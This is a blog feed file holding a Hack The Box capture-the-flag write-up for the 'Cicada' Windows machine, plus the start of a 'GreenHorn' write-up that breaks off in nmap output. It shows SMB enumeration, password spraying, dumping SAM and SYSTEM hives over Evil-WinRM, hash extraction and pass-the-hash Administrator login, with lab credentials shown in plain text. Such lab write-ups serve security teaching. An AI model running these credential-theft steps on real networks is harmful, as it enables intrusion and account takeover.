@@ -1,0 +1,835 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://oxapavan.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://oxapavan.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-12-25T23:28:53+00:00</updated><id>https://oxapavan.github.io/feed.xml</id><subtitle></subtitle><entry><title type="html">Hackthebox cicada Machine Writeup</title><link href="https://oxapavan.github.io/blog/2024/HTB-Cicada-WriteUp/" rel="alternate" type="text/html" title="Hackthebox cicada Machine Writeup"/><published>2024-11-15T00:00:00+00:00</published><updated>2024-11-15T00:00:00+00:00</updated><id>https://oxapavan.github.io/blog/2024/HTB-Cicada-WriteUp</id><content type="html" xml:base="https://oxapavan.github.io/blog/2024/HTB-Cicada-WriteUp/"><![CDATA[<div style="display: flex; justify-content: center;"> <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;"/> </div> <ul> <li>OS Wndows #### Initial reconnaissance of the target machine revealed a domain controller through comprehensive Nmap scanning. Exploring the SMB service anonymously uncovered a critical /HR directory containing a recruitment notice with potential credential insights. Employing enumeration tools like enum4linux and nxc, I systematically mapped user accounts and validated potential entry points. Kerbrute assisted in username verification, ultimately leveraging discovered credentials to establish initial access. This methodical approach provided a strategic foothold for further privilege escalation and comprehensive system exploration within the controlled Hack The Box environment.</li> </ul> <h5 id="nmap-scan">Nmap Scan</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# nmap -sC -sV -Pn -A 10.10.11.35
+Nmap scan report for 10.10.11.35
+Host is up (0.30s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-15 01:32:28Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022 (88%)
+Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-11-15T01:33:26
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h00m00s
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   354.29 ms 10.10.16.1
+2   354.74 ms 10.10.11.35
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 126.87 seconds
+</code></pre></div></div> <p>After seeing Nmap scan i thought of checking Open shares, Users list So that i used <strong>nxc</strong> which is updated to crackmapexc.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# nxc  smb cicada.htb -u 'guest'  -p '' --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV                             
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
+</code></pre></div></div> <p>In this HR Having read access to few files, Let’s view those.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# smbclient //cicada.htb/HR -N
+smb: \&gt; LS
+  .                                   D        0  Thu Mar 14 17:59:09 2024
+  ..                                  D        0  Thu Mar 14 17:51:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024
+
+smb: \&gt; get  Notice from HR.txt  
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice 
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# cat Notice\ from\ HR.txt 
+
+Dear new hire!
+
+Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8 
+To change your password:
+
+1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
+2. Once logged in, navigate to your account settings or profile settings section.
+3. Look for the option to change your password. This will be labeled as "Change Password".
+4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
+5. After changing your password, make sure to save your changes.
+
+Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
+
+If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.
+
+Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
+
+Best regards,
+Cicada Corp
+</code></pre></div></div> <p>I found a password in HR.txt But now i don’t know username linked to password, So that i started to bruteforce all username using rid-brute.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ nxc smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser
+SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ nano username.txt                
+Administrator
+Guest
+krbtgt
+CICADA-DC$
+john.smoulder
+sarah.dantelia
+michael.wrightson
+david.orelious
+emily.oscars
+</code></pre></div></div> <p>Let’s try to enumarate username with above password.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                                                                                                                              
+┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ nxc smb cicada.htb -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+                                                                                                                                                              
+</code></pre></div></div> <p>Gather detailed information about the target Windows/Samba system</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ enum4linux -a -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 15 18:33:47 2024
+
+ =========================================( Target Information )=========================================
+
+Target ........... cicada.htb
+RID Range ........ 500-550,1000-1050
+Username ......... 'michael.wrightson'
+Password ......... 'Cicada$M6Corpb*@Lp#nZp!8'
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+ =================================( Nbtstat Information for cicada.htb )=================================
+
+Looking up status of 10.10.11.35
+No reply from 10.10.11.35
+
+ ====================================( OS information on cicada.htb )====================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for cicada.htb from srvinfo: 
+	CICADA.HTB     Wk Sv PDC Tim NT     CICADA-DC
+	platform_id     :	500
+	os version      :	10.0
+	server type     :	0x80102b
+
+
+ ========================================( Users on cicada.htb )========================================
+
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
+index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
+index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars	Name: Emily Oscars	Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder	Name: (null)	Desc: (null)
+index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
+index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson	Name: (null)	Desc: (null)
+index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia	Name: (null)	Desc: (null)
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[john.smoulder] rid:[0x450]
+user:[sarah.dantelia] rid:[0x451]
+user:[michael.wrightson] rid:[0x452]
+user:[david.orelious] rid:[0x454]
+user:[emily.oscars] rid:[0x641]
+</code></pre></div></div> <p>In above enumerration david.orelious Left his password in description.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# smbclient //CICADA.HTB/DEV -U david.orelious
+Password for [WORKGROUP\david.orelious]:
+Try "help" to get a list of possible commands.
+smb: \&gt; LS
+  .                                   D        0  Thu Mar 14 18:01:39 2024
+  ..                                  D        0  Thu Mar 14 17:51:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024
+
+		4168447 blocks of size 4096. 413454 blocks available
+smb: \&gt; get Backup_script.ps1
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ cat  Backup_script.ps1           
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+</code></pre></div></div> <p>Again from david.orelious Shares we got emily.oscars password. Let’s try to enumerate emily.oscars Windows/Samba system.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop]
+└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+Directory: C:\Users\emily.oscars.CICADA\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/15/2024   3:01 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; cat user.txt
+****************************
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; cd c:\
+*Evil-WinRM* PS C:\&gt; ls
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-----        11/15/2024   3:39 PM                temp
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows
+
+
+*Evil-WinRM* PS C:\&gt; -a----        11/15/2024   1:53 PM          49152 sam.save 
+The term '-a----' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ -a----        11/15/2024   1:53 PM          49152 sam.save
++ ~~~~~~
+    + CategoryInfo          : ObjectNotFound: (-a----:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+^C
+                                        
+Warning: Press "y" to exit, press any other key to continue
+
+y
+*Evil-WinRM* PS C:\&gt; 
+*Evil-WinRM* PS C:\&gt; y
+The term 'y' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ y
++ ~
+    + CategoryInfo          : ObjectNotFound: (y:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\&gt; reg save hklm\sam c:\temp\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\&gt; reg save hklm\system c:\temp\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\&gt; download sam
+                                        
+Info: Downloading C:\\sam to sam
+                                        
+Error: Download failed. Check filenames or paths
+*Evil-WinRM* PS C:\&gt; cd temp
+*Evil-WinRM* PS C:\temp&gt; ls
+
+
+    Directory: C:\temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/15/2024   4:27 PM          49152 sam
+-a----        11/15/2024   4:28 PM       18518016 system
+
+
+d*Evil-WinRM* PS C:\temp&gt; download sam
+                                        
+Info: Downloading C:\temp\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\temp&gt; download system
+                                        
+Info: Downloading C:\temp\system to system
+                                          
+Info: Download successful!
+*Evil-WinRM* PS C:\temp&gt; exit
+^C
+                                        
+Warning: Press "y" to exit, press any other key to continue
+                                        
+Info: Exiting...
+
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+</code></pre></div></div> <p>Used Evil-WinRM to log in as emily.oscars, accessed system files, In this i got user flag and extracted sensitive SAM and SYSTEM registry hives from the Windows machine at cicada.htb. Help’s for offline password cracking.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop]
+└─$ ls -la
+
+-rw-rw-r--  1 angrybird angrybird     49152 Nov 15 22:59  sam
+-rw-rw-r--  1 angrybird angrybird  18518016 Nov 15 23:07  system
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop]
+└─$ pypykatz registry --sam sam system             
+
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre></div></div> <p>pypykatz didn’t worked at begining, After some research i updated code. And then Used to extract password hashes from the previously downloaded SAM and SYSTEM registry files, Successfully extracted system boot key and user account password hashes. Retrieved hashes for Administrator, Guest, DefaultAccount, and WDAGUtilityAccount.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ls
+    Directory: C:\Users\Administrator\Documents
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/14/2024  10:20 PM                WindowsPowerShell
+
+
+cd*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; ls
+
+    Directory: C:\Users\Administrator
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         3/14/2024   3:45 AM                3D Objects
+d-r---         3/14/2024   3:45 AM                Contacts
+d-r---         8/30/2024  10:06 AM                Desktop
+d-r---         3/14/2024  10:20 PM                Documents
+d-r---         3/14/2024   3:45 AM                Downloads
+d-r---         3/14/2024   3:45 AM                Favorites
+d-r---         3/14/2024   3:45 AM                Links
+d-r---         3/14/2024   3:45 AM                Music
+d-r---         3/14/2024   3:45 AM                Pictures
+d-r---         3/14/2024   3:45 AM                Saved Games
+d-r---         3/14/2024   3:45 AM                Searches
+d-r---         3/14/2024   3:45 AM                Videos
+
+
+cd *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/15/2024   3:01 PM             34 root.txt
+
+
+cat*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+*****************************
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; enum4lin
+                                        
+Warning: Press "y" to exit, press any other key to continue
+</code></pre></div></div> <p>Logged in as Administrator using the previously extracted hash via Evil-WinRM. Navigated through Administrator’s user directories. Accessed Desktop folder Retrieved and read root.txt.</p>]]></content><author><name></name></author><category term="Credential Compromise"/><category term="Privilege Escalation"/><summary type="html"><![CDATA[Detailed writeup of [Cicada](https://www.hackthebox.com/machines/cicada)]]></summary></entry><entry><title type="html">Hackthebox GreenHorn Machine Writeup</title><link href="https://oxapavan.github.io/blog/2024/HTB-GreenHorn-WriteUp/" rel="alternate" type="text/html" title="Hackthebox GreenHorn Machine Writeup"/><published>2024-11-12T00:00:00+00:00</published><updated>2024-11-12T00:00:00+00:00</updated><id>https://oxapavan.github.io/blog/2024/HTB-GreenHorn-WriteUp</id><content type="html" xml:base="https://oxapavan.github.io/blog/2024/HTB-GreenHorn-WriteUp/"><![CDATA[<div style="display: flex; justify-content: center;"> <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;"/> </div> <h3 id="overview">overview</h3> <p>Greenhorn is a beginner-friendly machine. Starting with credential harvesting to revershell upload &amp; then trying with pdf extraction.</p> <ul> <li>OS Linux</li> <li>Point’s 20</li> </ul> <h3 id="cve-2022-26965-pluck-remote-code-execution">(CVE-2022-26965) Pluck Remote Code Execution</h3> <h5 id="the-attacker-who-already-has-an-account-can-upload-a-fake-module-to-the-system-and-can-execute-the-content-from-this-module-on-the-server-the-attacker-executes-an-info-file-from-the-already-fake-uploaded-module-and-gets-all-information-for-this-system-this-is-a-critical-vulnerability-the-problem-is-that-these-developers-are-not-making-a-strong-sanitizing-upload-function-and-do-not-restrict-the-execution-from-inside-of-the-server">The attacker who already has an account can upload a fake module to the system and can execute the content from this module on the server. The attacker executes an info file from the already fake uploaded module and gets all information for this system. This is a CRITICAL Vulnerability. The problem is that these developers are not making a strong sanitizing upload function and do not restrict the execution from inside of the server.</h5> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
+└─$ nmap -sV -sC 10.10.11.25  
+Starting Nmap 7.94SVN ( https://nmap.org ) 
+Stats: 0:02:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 71.12% done;
+Nmap scan report for 10.10.11.25
+Host is up (0.37s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
+|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://greenhorn.htb/
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=b8fecf263c1e35a9; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=bxkgOSoV_o-2Ply3BAH0UWmMAPU6MTczMTQzMTQ0NDUxMzAyMTk0MQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-auto"&gt;
+|     &lt;head&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;title&gt;GreenHorn&lt;/title&gt;
+|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=b0bc6ae68de3fbb6; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=GoskDxug-DQHcGB4MQuqxdNJXCk6MTczMTQzMTQ2MjM2MjAzMTY4OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.94SVN%I=7%D=11/12%Time=67338C13%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request")%r(GetRequest,2A5C,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
+SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
+SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
+SF:tea=b8fecf263c1e35a9;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
+SF:okie:\x20_csrf=bxkgOSoV_o-2Ply3BAH0UWmMAPU6MTczMTQzMTQ0NDUxMzAyMTk0MQ;\
+SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
+SF:tions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2012\x20Nov\x202024\x2017:10:44\
+SF:x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"th
+SF:eme-auto\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=\"width=de
+SF:vice-width,\x20initial-scale=1\"&gt;\n\t&lt;title&gt;GreenHorn&lt;/title&gt;\n\t&lt;link\
+SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
+SF:R3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA
+SF:6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbm
+SF:hvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciL
+SF:CJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAv
+SF:YX")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
+SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
